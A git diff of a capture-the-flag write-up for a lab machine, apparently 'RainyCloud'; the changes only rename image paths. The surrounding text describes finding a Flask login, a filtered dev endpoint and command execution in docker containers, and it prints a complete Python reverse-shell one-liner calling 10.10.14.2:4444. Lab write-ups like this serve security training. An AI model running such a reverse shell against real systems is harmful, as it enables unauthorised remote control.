@@ -30,7 +30,7 @@ Enumeration of vhosts also revealed the dev.rainycloud.htb domain.
 
 Investigating the login function, we can see that on a failed attempt, this appears within the page source.
 
-<figure><img src="../../../.gitbook/assets/image (128) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (128) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Pretty much confirms that this is a Flask application with app.py being used.
 
@@ -38,7 +38,7 @@ Pretty much confirms that this is a Flask application with app.py being used.
 
 There's some form of WAF or ACL on the dev endpoint.
 
-<figure><img src="../../../.gitbook/assets/image (114) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (114) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This looks bypassable using SSRF, but I was unable to make it work.
 
@@ -70,7 +70,7 @@ Within the login, we are able to simply register and start a new docker containe
 
 Within each docker container, we can basically get RCE on it. This can be done using the execute command button. I found that using the one without the background creates a very unstable shell, so use the other one.
 
-<figure><img src="../../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (119) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 We can use this reverse shell command:
 
@@ -78,7 +78,7 @@ We can use this reverse shell command:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (110) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Pivoting
 
